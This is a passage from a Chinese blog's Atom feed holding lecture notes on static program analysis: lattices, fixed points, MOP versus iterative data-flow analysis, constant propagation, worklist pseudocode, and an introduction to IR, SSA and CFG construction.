(\mathrm{IN}-kill)$</td><td>-</td><td>-</td></tr><tr><td>Meet(May/Must)</td><td>$\cup$</td><td>$\cup$</td><td>$\cap$</td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Overview-amp-Preliminaries&quot;&gt;&lt;a href=&quot;#Overview-amp-Preliminaries&quot; class=&quot;headerlink&quot; title=&quot;Overview &amp;amp;  Preliminaries&quot;&gt;&lt;/a&gt;Overview &amp;amp;  Preliminaries&lt;/h1&gt;&lt;p&gt;两类分析：&lt;/p&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;may Analysis：over-approximation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;must Analysis：under-approximation&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;实际上都是为了safety of analysis。&lt;/p&gt;&lt;h2 id=&quot;对数据流分析的几种解释&quot;&gt;&lt;a href=&quot;#对数据流分析的几种解释&quot; class=&quot;headerlink&quot; title=&quot;对数据流分析的几种解释&quot;&gt;&lt;/a&gt;对数据流分析的几种解释&lt;/h2&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="数据流分析" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="PL" scheme="http://anemone.top/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>静态程序分析课程笔记（数据流分析-理论基础）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E7%90%86%E8%AE%BA%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（数据流分析-理论基础）/</id>
    <published>2020-08-02T09:34:13.000Z</published>
    <updated>2020-08-17T13:12:11.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Iterative-Algorithm"><a href="#Iterative-Algorithm" class="headerlink" title="Iterative Algorithm"></a>Iterative Algorithm</h1><ul><li><p>对于一个含 $k$ 个节点的CFG，每个迭代算法对于每个node $n$ 更新$\mathrm{OUT}[n]$。</p></li><li><p>假设迭代算法的研究对象（domain）是$V$，定义一个k元组$V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$，$V^k\in(V_1 \times V_2 \times \dots \times V_k)$，$V^k$ 即一次迭代产生的输出，每次迭代会更新$V^k$，可以将每次迭代经过transfer functions和control-flow handing的过程抽象为$F: V^k\rightarrow {V^{k}}’$</p></li><li><p>当$V^k\rightarrow {V^{k}}’$时，即$X=F(X)$ ，称$F(x)$在$X$处到达了<strong>不动点</strong>，$X$为$F(x)$的不动点，</p></li></ul><a id="more"></a><h1 id="Poset-amp-partial-order（偏序集和偏序）"><a href="#Poset-amp-partial-order（偏序集和偏序）" class="headerlink" title="Poset &amp; partial order（偏序集和偏序）"></a>Poset &amp; partial order（偏序集和偏序）</h1><blockquote><p>We define <strong>poset</strong> as a pair (P, ⊑) where ⊑ is a binary relation that defines a partial ordering over P, and ⊑ has the following properties: </p><p>(1) $\forall x \in P, x \sqsubseteq x$  (Reflexivity, 自反性)<br>(2) $\forall x, y \in P, x \sqsubseteq y \wedge y \sqsubseteq x \Rightarrow x=y \quad$ (Antisymmetry，反对称性)<br>(3) $\forall x,y,z \in P, x \sqsubseteq y \wedge y \sqsubseteq z \Rightarrow x \sqsubseteq z $ (Transitivity，传递性)</p></blockquote><p><strong>偏序集</strong>为一个二元组$(P, \sqsubseteq)$，$P$为一集合，$\sqsubseteq$为在集合上的一种比较关系，这个二元组为偏序集当且仅当集合元素在关系上满足自反性、反对称性和传递性。</p><p><strong>偏序</strong>的含义：一个集合中的任意两个元素不一定存在顺序关系（任意两元素不一定能比较大小）</p><h1 id="Uppper-and-Lower-Bounds（上界和下界）"><a href="#Uppper-and-Lower-Bounds（上界和下界）" class="headerlink" title="Uppper and Lower Bounds（上界和下界）"></a>Uppper and Lower Bounds（上界和下界）</h1><blockquote><p>Given a poset (P, ⊑) and its subset $S$ that  $S\subseteq P$, we say that $u\in P$ is an <strong>upper bound</strong> of $S$, if $\forall x \in P, x\sqsubseteq u$. Similarly, $l∈P$ is an <strong>lower bound</strong> of $S$, if $\forall x \in P, l\sqsubseteq u$.</p></blockquote><p>如图，$\{a,b,c\}$是$S$的上界（灰色），$\{\}$是$S$的下界：</p><p><img src="/pl-静态程序分析课程笔记（数据流分析-理论基础）/image-20200804204606009.png" alt="image-20200804204606009"></p><h2 id="最小上界、最大下界"><a href="#最小上界、最大下界" class="headerlink" title="最小上界、最大下界"></a>最小上界、最大下界</h2><blockquote><p>We define the <strong>least upper bound (lub or join)</strong> of $S$, written $⊔S$, if for every upper bound of $S$, say $u, ⊔S⊑u$. Similarly, We define the <strong>greatest lower bound (glb or meet)</strong> of $S$, written $⊓S$, if for every lower bound of $S$, say $l, l⊑⊓S$.</p></blockquote><p>特别的，对于仅有两个元素的集合$S=\{a,b\}$，$\sqcup S$ 可以写为$a \sqcup b$，同理 $\sqcap S$可以写为 $a\sqcap b$。</p><p><strong>注意：</strong>（最小）上界和（最大）下界是针对集合中的特定子集的，而上下界本身不一定在子集中，并且：</p><ul><li>不是所有偏序集均存在lub或者glb（如先前灰色的集合就不含lub）</li><li>如果一个偏序集存在lub和glb，那么它是唯一的<ul><li>证明： 设$g_1$ 和$g_2$ 同为 P 的glb，那么根据定义 $g_1\sqsubseteq (g_2 = \sqcap P)$ 并且$g_2\sqsubseteq (g_1 = \sqcap P)$，又因为反对称性，所以$g_1=g_2$</li></ul></li></ul><h1 id="Lattice-Semilattice-Complete-and-Product-Lattice"><a href="#Lattice-Semilattice-Complete-and-Product-Lattice" class="headerlink" title="Lattice, Semilattice, Complete and Product Lattice"></a>Lattice, Semilattice, Complete and Product Lattice</h1><h2 id="Lattice（格）"><a href="#Lattice（格）" class="headerlink" title="Lattice（格）"></a>Lattice（格）</h2><blockquote><p>Given a poset $(P, ⊑), ∀a,b∈P$, if $a⊔b$ and $a⊓b$ exist, then $(P,⊑)$ is called a lattice. </p></blockquote><p>如果一个偏序集的任意两个元素都有最小上界和最大下界，那么这一偏序集是一个<strong>格</strong></p><h2 id="Semilattice"><a href="#Semilattice" class="headerlink" title="Semilattice"></a>Semilattice</h2><p>最小上界和最大下界只存在一个的偏序集称<strong>半格</strong>，只存在最小上界称为“join semilattice”，只存在最大下界称为“meet semilattice”。</p><h2 id="Complete-Lattice，top-amp-bottom（全格，-top-和-perp-）"><a href="#Complete-Lattice，top-amp-bottom（全格，-top-和-perp-）" class="headerlink" title="Complete Lattice，top &amp; bottom（全格，$\top$ 和 $\perp$）*"></a>Complete Lattice，top &amp; bottom（全格，$\top$ 和 $\perp$）*</h2><blockquote><p>Given a lattice $(P,⊑)$, for arbitrary subset $S$ of $P$, if $⊔S$ and $⊓S$ exist, then $(P,⊑)$ is called a complete lattice.</p></blockquote><p>一个偏序集的任意子集均存在最小上界和最大下界，那么这个偏序集成为<strong>全格</strong>。</p><p>每个全格都存在一个最大元素 top（$\top=\sqcup P$）和最小元素bottom（$\perp=\sqcap P$）</p><p>所有元素有限的格（finite lattice）均是全格。（反之不成立）</p><h2 id="Product-Lattice"><a href="#Product-Lattice" class="headerlink" title="Product Lattice"></a>Product Lattice</h2><blockquote><p>Given lattices $L_1=(P_1,⊑_1),L_2=(P_2,⊑_2),…,L_n=(P_n,⊑)n)$, if for all $i$, $(P_i,⊑_i)$ has $⊔i$(least upper bound) and $⊓_i$(greatest lower bound), then we can have a product lattice $L^n=(P,⊑)$ that is defined by:</p><ul><li>$P=P_{1} \times \ldots \times P_{n}$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqsubseteq\left(y_{1}, \ldots, y_{n}\right) \Leftrightarrow\left(x_{1} \sqsubseteq y_{1}\right) \wedge \ldots \wedge\left(x_{n} \sqsubseteq y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcup\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcup_{1} y_{1}, \ldots, x_{n} \cup_{n} y_{n}\right)$</li><li>$\left(x_{1}, \ldots, x_{n}\right) \sqcap\left(y_{1}, \ldots, y_{n}\right)=\left(x_{1} \sqcap_{1} y_{1}, \ldots, x_{n} \sqcap_{n} y_{n}\right)$</li></ul></blockquote><p>Product Lattice仍是Lattice，若每个子格为全格，那么乘积也是全格。</p><h1 id="Data-Flow-Analysis-Framework-via-Lattice"><a href="#Data-Flow-Analysis-Framework-via-Lattice" class="headerlink" title="Data Flow Analysis Framework via Lattice"></a>Data Flow Analysis Framework via Lattice</h1><p>一个数据流分析框架可以表示为一个三元组$(D,L,F)$ ，其中：</p><ul><li>D：指数据流分析的方向，i.e., forward or backward；</li><li>L：指lattice，该格表示所有domain值域，以及meet（$\sqcap$）或join（$\sqcup$）操作；</li><li>F：一组transfer function。</li></ul><h1 id="Monotonicity-and-Fixed-Point-Theorem"><a href="#Monotonicity-and-Fixed-Point-Theorem" class="headerlink" title="Monotonicity and Fixed Point Theorem"></a>Monotonicity and Fixed Point Theorem</h1><h2 id="Monotonicity（单调性）"><a href="#Monotonicity（单调性）" class="headerlink" title="Monotonicity（单调性）"></a>Monotonicity（单调性）</h2><blockquote><p>A function $f: L→L$ ($L$ is a lattice) is monotonic if $∀x,y∈L$,  $x⊑y⟹f(x)⊑f(y)$</p></blockquote><p>普通函数的单调性的推广</p><h2 id="Fixed-Point-Theorem"><a href="#Fixed-Point-Theorem" class="headerlink" title="Fixed-Point Theorem"></a>Fixed-Point Theorem</h2><blockquote><p>Given a complete lattice ($L,⊑$), if (1) $f:L→L$ is monotonic and (2) $L$ is finite, then the <strong>least fixed point</strong> of $f$ can be found by iterating $f(⊥), f(f(⊥)), \dots, f^k(⊥)$ until a fixed point is reached the greatest fixed point of $f$ can be found by iterating $f(\top),f(f(\top)),\dots, f^k(\top)$ until a fixed point is reached.</p></blockquote><p>如果f单调且L有界，那么f存在不动点，从$⊥$开始迭代执行$f$可得最小不动点，从$\top$开始迭代可得最大不动点。</p><p>证明：<br>(1) Existence<br>由$\perp$定义以及$f:L\rightarrow L$可得</p><script type="math/tex; mode=display">\perp \sqsubseteq f(\perp)</script><p>又因$f$是单调的，因此</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(f(\perp))=f^2(\perp)</script><p>由于L是有限(finite)的，因此总会存在一个k，有</p><script type="math/tex; mode=display">f^{Fix}=f^k(\perp)=f^{k+1}(\perp)</script><p>（2）Least Fixed Point（数归法，证明最小）</p><p>假设我们有另一个不动点x，i.e., $x=f(x)$</p><p>由$\perp$的定义，我们有$\perp \sqsubseteq x$;</p><p>下面用数归法证明：</p><p>由于 $f$ 是单调的，因此</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(x)</script><p>对于$f^i(\perp)\sqsubseteq f^i(x)$，由于 $f$ 是单调的，因此我们有</p><script type="math/tex; mode=display">f^{i+1}(\perp)\sqsubseteq f^{i+1}(x)</script><p>因此对于任意i，有</p><script type="math/tex; mode=display">f^i(\perp)\sqsubseteq f^i(x)</script><p>又因为$x=f(x)$，所以存在一个i，有$f^i(\perp)\sqsubseteq f^i(x)=x$，因此有</p><script type="math/tex; mode=display">f^{Fix} = f^k(\perp) \sqsubseteq x</script><p>因此$f^i(\perp)$ 是最小不动点。</p><h1 id="Relate-lterative-Algorithm-to-Fixed-Point-Theorem"><a href="#Relate-lterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="Relate lterative Algorithm to Fixed Point Theorem"></a>Relate lterative Algorithm to Fixed Point Theorem</h1><p>如何将迭代算法和不动点定理联系起来？</p><ol><li>程序中每一个状态为一个product lattice</li><li>Transfer function和join/meet fucntion可以视为F</li></ol><p><img src="/pl-静态程序分析课程笔记（数据流分析-理论基础）/image-20200812205336289.png" alt="image-20200812205336289"></p><p>下面只需要证明Transfer function和 join/meet function均为单调的即可</p><ol><li><p>Transfer function是单调的，因为通过之前分析，所有Gen/Kill的函数都是单调的；</p></li><li><p>Join/meet function是单调的，证明如下</p><p>要证Join/meet function，就是要证$\forall x, y, z \in L, x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p><p>由 $\sqcup$ 定义可得，$y \sqsubseteq y \sqcup z$，</p><p>由于$\sqsubseteq$传递性，$x \sqsubseteq y$，因此$x \sqsubseteq y \sqcup z$，因此 $y \sqcup z$ 是 $x$ 的上界，</p><p>注意到 $y \sqcup z$ 也是 $z$ 的上界，而$x\sqcup z$ 是 $x$ 和 $z$ 的最小上界，</p><p>因此 $ x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p></li></ol><p><strong>讨论算法复杂度</strong></p><p>定义格的高度即从top至bottom的最长路径长，</p><blockquote><p>The height of a lattice $h$ is the length of the longest path from Top to Bottom in the lattice.</p></blockquote><p>最坏情况即一次迭代，只变化一个单位高度，因此复杂度为$O(h \times k)$.</p><h1 id="May-Must-Analysis-A-Lattice-View"><a href="#May-Must-Analysis-A-Lattice-View" class="headerlink" title="May/Must Analysis, A Lattice View*"></a>May/Must Analysis, A Lattice View*</h1><p>任何分析初始状态都从unsafe至safe。</p><p>个人对safe和unsafe的理解：针对于分析结果而言，处理所有分析结果后，程序行为正常为safe，反之为unsafe，极端的safe是无用的（如安全扫描中的模式匹配）<br><img src="/pl-静态程序分析课程笔记（数据流分析-理论基础）/image-20200812214731510.png" alt="image-20200812214731510"></p><p>Must和May分析的示意图如上图所示，对于Must分析，每个代码块都是从 $\top$ 开始的，因为在程序一开始，算法认为所有的待分析对象都是“合格”的（例如存活表达式分析中，算法认为每个表达式都是成活的）——这是一个不安全的状态，经过不断迭代，算法逐渐下降到最大不动点，虽然已经过了truth点（漏报），但是这已经是最好情况了（越往下走越safe但是结果也没意义了），对这些结果做优化能确保程序不出错（safe）。</p><p>对于May分析，每个代码块从 $\perp$ 开始，即在一开始，算法认为所有分析对象都是不合格的（例如定义可达性分析中，算法认为每一条定义都没有新的定义）——这是May类型的不安全状态，经过不断迭代，算法逐渐上升到最小不动点，同样也过了truth（误报），这也是分析的最好情况，算法依旧停留在safe区域。</p><h1 id="Distributivity（分配性）-and-MOP"><a href="#Distributivity（分配性）-and-MOP" class="headerlink" title="Distributivity（分配性） and MOP"></a>Distributivity（分配性） and MOP</h1><h2 id="MOP（Meet-Over-All-Paths-Solution）"><a href="#MOP（Meet-Over-All-Paths-Solution）" class="headerlink" title="MOP（Meet-Over-All-Paths Solution）"></a>MOP（Meet-Over-All-Paths Solution）</h2><p>设 $s_x$ 为每一个statments，设 $F_p$ 是一个路径 $P$ 上的 transfer function，那么$MOP[S_i]=\sqcup/\sqcap_{\text{A path }P\text{ from Entry to }S_{i}} F_p(OUT[Entry])$.</p><p><img src="/pl-静态程序分析课程笔记（数据流分析-理论基础）/image-20200814215920162.png" alt="image-20200814215920162"></p><p>就是说，之前数据流分析的结果是<strong>流敏感</strong>的，而 MOP 的结果是路径敏感的，</p><p>例如下图所示的数据流，数据流分析的结果是 $\mathrm{IN}\left[\mathrm{s}_{4}\right]=f_{s_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ]) \sqcup f_{S_{2}}( OUT [ Entry ])\right)$，而MOP是 $ \mathrm{MOP}\left[\mathrm{s}_{4}\right]=f_{S_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ])\right) \sqcup f_{S_{3}}\left(f_{S_{2}}(\mathrm{OUT}[ Entry ])\right)$（注意$f_{s_3}$的位置）</p><p><img src="/pl-静态程序分析课程笔记（数据流分析-理论基础）/image-20200814220329588.png" alt="image-20200814220329588" style="zoom:50%;"></p><h2 id="Iterative-Algorithm-v-s-MOP"><a href="#Iterative-Algorithm-v-s-MOP" class="headerlink" title="Iterative Algorithm v.s. MOP"></a>Iterative Algorithm v.s. MOP</h2><p>MOP比Iterative分析更精确，也就是说路径敏感比敏感更精确，下面为证明（这里只需证明两条路径的情况，其它数归即可）：</p><p>由 $\sqcup$ 的定义得 $\mathrm{x} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ 且 $\mathrm{y} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$；</p><p>因为 $F$ 是单调的，因此有 $F(x) \sqsubseteq F(x \sqcup y)$ 且 $F(y) \sqsubseteq F(x \sqcup y)$；</p><p>因此$F(x\sqcup y)$ 是 $F(x)$ 和 $F(y)$ 的上界；</p><p>又因为$F(x)\sqcup F(y)$是 $F(x)$ 和 $F(y)$ 的最小上界；</p><p>因此 $ F(x) \sqcup F(y) \sqsubseteq F(x\sqcup y)$，即$MOP \sqsubseteq Ours$。</p><p>然而，当F是distributive（F满足分配率）时，Interative和MOP一样准确。</p><p>BitVector或是Gen/Kill问题（set union/intersection for join/meet）都是满足分配率的</p><h1 id="Constant-Propagation"><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h1><blockquote><p>Given a variable $x$ at program point p, determine whether $x$ is guaranteed to hold a constant value at $p$</p></blockquote><p>对于在程序点 $p$ 的一个变量 $x$，判断 $x$ 是否为在 $p$ 点为一个常量</p><p>分析结果：对于每一个CFG节点，对应一个 $(x,v)$ 集合，$x$ 是变量，$v$ 是 $x$ 的值</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>Domain： UNDEF → {…, -2, -1, 0, 1, 2, …} → NAC ，→ 表示 $\sqsubseteq$ 关系</p><p>Meet Operator $\sqcap$：</p><ul><li>$\mathrm{NAC} \sqcap v= \mathrm{NAC}$</li><li>$\mathrm{UNDEF} \sqcap v= v$</li><li>$c \sqcap v= \mathrm{NAC}$ （c 为一常量）</li><li>$c \sqcap c= c$</li><li>$c_1 \sqcap c_2 = \mathrm{NAC}$</li></ul><h2 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h2><p>讨论transfer function，对于一个赋值语句 <code>s: x= ...</code> 来说，定义其 F 为</p><script type="math/tex; mode=display">F: \mathrm{OUT}[s]=gen \cup(\mathrm{IN}[s]-\{(x, \_)\})</script><ul><li><code>s: x=c;</code>  $gen=\{(x,c)\}$</li><li><code>s: x=y;</code> $gen=\{(x, val(y))\}$</li><li><code>s: x=y op z;</code> $gen=\{(x, f(x,z))\}$ </li></ul><p>而 $f(x,z)$ 有三种情况：</p><script type="math/tex; mode=display">f(y,z)=\left\{\begin{array}{ll} val(y) \text { op } val(z) & \text {// if val(y) and val(z) are constants } \\ \text { NAC } & \text {//if val(y) or val(z) is NAC } \\\text { UNDEF } & \text {// otherwise } \\\end{array}\right.</script><h2 id="function不满足分配性"><a href="#function不满足分配性" class="headerlink" title="function不满足分配性"></a>function不满足分配性</h2><p>如下图所示，$F(X\sqcap Y)$ 中C的值为<strong>NAC</strong>，而$F(X) \sqcap F(Y)$中 C 的值为<strong>10</strong>，因此F不满足分配性。</p><p><img src="/pl-静态程序分析课程笔记（数据流分析-理论基础）/image-20200815173321586.png" alt="image-20200815173321586"></p><h1 id="Worklist-Algorithm"><a href="#Worklist-Algorithm" class="headerlink" title="Worklist Algorithm"></a>Worklist Algorithm</h1><p>Iterative Algorithm的优化，Iterative 存在冗余的计算，而Worklist只计算有变化的node：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OUT[entry] =∅;</span><br><span class="line"><span class="keyword">for</span>(each basic block B\entry) </span><br><span class="line">OUT[B] =∅;</span><br><span class="line">    Worklist←all basic blocks</span><br><span class="line"><span class="keyword">while</span> (Worklist <span class="keyword">is</span> notempty) </span><br><span class="line">    Pick a basic block B <span class="keyword">from</span> Worklist</span><br><span class="line">old_OUT= OUT[B]</span><br><span class="line">        IN[B] =⊔OUT[P]; <span class="comment"># join/meet P为B的前置代码块</span></span><br><span class="line">        OUT[B] = genB U (IN[B] - killB); <span class="comment"># transfer function </span></span><br><span class="line">        <span class="keyword">if</span>(old_OUT≠OUT[B])</span><br><span class="line">        Add all successors of B to Worklis</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本节课主要介绍格，接着用格抽象描述数据流分析，解释为什么迭代算法能够到达最大/最小不动点，接着比较了流敏感和路径敏感的准确性，最后介绍worklist算法，以提升迭代算法的效率。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Iterative-Algorithm&quot;&gt;&lt;a href=&quot;#Iterative-Algorithm&quot; class=&quot;headerlink&quot; title=&quot;Iterative Algorithm&quot;&gt;&lt;/a&gt;Iterative Algorithm&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;对于一个含 $k$ 个节点的CFG，每个迭代算法对于每个node $n$ 更新$\mathrm{OUT}[n]$。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;假设迭代算法的研究对象（domain）是$V$，定义一个k元组$V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$，$V^k\in(V_1 \times V_2 \times \dots \times V_k)$，$V^k$ 即一次迭代产生的输出，每次迭代会更新$V^k$，可以将每次迭代经过transfer functions和control-flow handing的过程抽象为$F: V^k\rightarrow {V^{k}}’$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;当$V^k\rightarrow {V^{k}}’$时，即$X=F(X)$ ，称$F(x)$在$X$处到达了&lt;strong&gt;不动点&lt;/strong&gt;，$X$为$F(x)$的不动点，&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="数据流分析" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="PL" scheme="http://anemone.top/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>静态程序分析课程笔记（简介）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E7%AE%80%E4%BB%8B%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（简介）/</id>
    <published>2020-08-02T08:34:13.000Z</published>
    <updated>2020-08-15T09:46:31.427Z</updated>
    
    <content type="html"><![CDATA[<p>母校计算机院的李樾、谭添老师讲的课，听了第一节课就哭了，决定做一下笔记，课程网站 <a href="https://pascal-group.bitbucket.io/teaching.html。" target="_blank" rel="noopener">https://pascal-group.bitbucket.io/teaching.html。</a></p><h1 id="PL知识体系"><a href="#PL知识体系" class="headerlink" title="PL知识体系"></a>PL知识体系</h1><p><img src="/pl-静态程序分析课程笔记（简介）/image-20200802113608162.png" alt="image-20200802113608162"></p><p>如上图所示，主要分三大块，理论部分包含语言设计、类型系统、语义和逻辑检查；环境部分包含编译器和运行时设计等；应用部分包含程序分析、程序验证和程序生成等，本课程主要关注于应用方面的程序分析。</p><a id="more"></a><h1 id="Rice’s-Theorem（莱斯定理）"><a href="#Rice’s-Theorem（莱斯定理）" class="headerlink" title="Rice’s Theorem（莱斯定理）"></a>Rice’s Theorem（莱斯定理）</h1><blockquote><p>Any non-trivial property of the behavior of programs in a r.e. language is undecidable.</p></blockquote><p>对递归可枚举语言来说，不存在一个完美（Sound&amp;Complete）的，用于判定程序中non-trivial的属性的方法。</p><p>这里“non-trivial property”可以理解为程序分析的种种目的，如变量是否空指针、是否存在信息泄露等。</p><h1 id="可靠性和完备性（soundness-amp-completeness）"><a href="#可靠性和完备性（soundness-amp-completeness）" class="headerlink" title="可靠性和完备性（soundness&amp;completeness）"></a>可靠性和完备性（soundness&amp;completeness）</h1><p>由莱斯定理，分析时出现sound和complete情况，存在两种妥协方案：</p><ul><li>Compromise soundness：妥协可靠性，即接受误报，该方案是静态分析较常见</li><li>Compromise completeness：妥协完备性，即接受漏报</li></ul><p>误报（False positive）与漏报（False negative）关系如下图所示：</p><p><img src="/pl-静态程序分析课程笔记（简介）/image-20200802115612020.png" alt="image-20200802115612020"></p><h1 id="简单的程序分析案例"><a href="#简单的程序分析案例" class="headerlink" title="简单的程序分析案例"></a>简单的程序分析案例</h1><p>分析在代码p处变量v的正负(+, -, 0)。</p><h2 id="定义数据抽象"><a href="#定义数据抽象" class="headerlink" title="定义数据抽象"></a>定义数据抽象</h2><ul><li>$+$：正</li><li>$-$：负</li><li>$0$：零</li><li>$\top$：未知</li><li>$\perp$：未定义</li></ul><h2 id="定义Transfer-Function"><a href="#定义Transfer-Function" class="headerlink" title="定义Transfer Function"></a>定义Transfer Function</h2><p>即读取一个二元操作statements，输出符号是什么，如下表：</p><p><img src="/pl-静态程序分析课程笔记（简介）/image-20200802154058197.png" alt="image-20200802154058197"></p><h2 id="定义Control-Flow-Merge"><a href="#定义Control-Flow-Merge" class="headerlink" title="定义Control Flow Merge"></a>定义Control Flow Merge</h2><p>在CFG中汇聚点中要合并情况<br><img src="/pl-静态程序分析课程笔记（简介）/image-20200802154239519.png" alt="image-20200802154239519"></p><h1 id="编译器vs-静态分析器"><a href="#编译器vs-静态分析器" class="headerlink" title="编译器vs.静态分析器"></a>编译器vs.静态分析器</h1><ul><li><p>编译器：<br>词法分析（产生tokens）→语法分析（产生AST）→语义分析（包括类型检查，产生Decorated AST）→翻译（产生IR）→代码生成 </p></li><li><p>静态分析：<br>静态分析基于IR</p></li></ul><h1 id="AST和IR"><a href="#AST和IR" class="headerlink" title="AST和IR"></a>AST和IR</h1><h2 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h2><ol><li>符合语法结构</li><li>依赖于特定语言</li><li>适合于类型检查</li><li>缺失控制流信息</li></ol><h2 id="IR"><a href="#IR" class="headerlink" title="IR"></a>IR</h2><ol><li>接近机器代码</li><li>语言无关</li><li>含有控制流信息</li></ol><h2 id="三地址码"><a href="#三地址码" class="headerlink" title="三地址码"></a>三地址码</h2><p>一种常用的IR：</p><ol><li>右侧只有一个操作</li><li>每一语句最多有三个“地址”（变量，常量）</li></ol><p>Soot 中的三地址码:</p><ul><li><code>@parameter</code>：函数参数</li><li><p><code>$x</code>：临时变量</p></li><li><p><code>&lt;method signature&gt;</code>：类+返回值类型+方法名+函数参数类型</p></li><li><code>&lt;init&gt;</code>：构造函数</li><li><code>&lt;clinit&gt;</code>：类初始化函数（静态变量初始化等）</li><li><code>invokespecial</code>：调用构造函数、父类方法、私有方法</li><li><code>invokevirtual</code>：实例方法调用（virtual dispatch）</li><li><code>invokeinterface</code>：不能优化、调用接口、检查接口实现</li><li><code>invokestatic</code>：调用静态方法</li><li><code>invokedynamic</code>：运行其他动态语言 </li></ul><h2 id="SSA"><a href="#SSA" class="headerlink" title="SSA"></a>SSA</h2><p>一种特殊的三地址码:</p><ul><li>每次赋值有新的变量名</li><li>每一个变量都有唯一定义</li></ul><p>优势：</p><ul><li>flow-insensitive analysis更准确</li><li>容易做优化算法</li></ul><p>劣势：</p><ul><li>引入大量变量</li><li>编译时有性能问题</li></ul><h1 id="Control-Flow-Graph"><a href="#Control-Flow-Graph" class="headerlink" title="Control Flow Graph"></a>Control Flow Graph</h1><p>Basic Block是CFG的主体。</p><ul><li>Basic Block：一个最长的语句序列，并保证入口只能在最开始指令且出口只能在最后一个指令</li></ul><h2 id="构造Basic-Blocks"><a href="#构造Basic-Blocks" class="headerlink" title="构造Basic Blocks"></a>构造Basic Blocks</h2><ul><li>Input：程序P的三地址码序列</li><li><p>Output：程序P的basic blocks</p></li><li><p>算法</p><ol><li><p>确定leaders（每个basic block的头）</p><ul><li>序列中的第一个指令</li><li>跳转指令的目标指令</li><li>跳转指令的下一条指令</li><li>return指令</li></ul></li><li><p>每个Basic Block包含其leader至下一个leader前的所有语句</p></li></ol></li></ul><h2 id="构造CFG"><a href="#构造CFG" class="headerlink" title="构造CFG"></a>构造CFG</h2><ul><li>添加边，在以下两种情况下：<ul><li>代码块存在先后顺序，且不存在无条件跳转</li><li>每个跳转间</li></ul></li><li>添加entry和exit节点</li></ul>]]></content>
    
    <summary type="html">
    
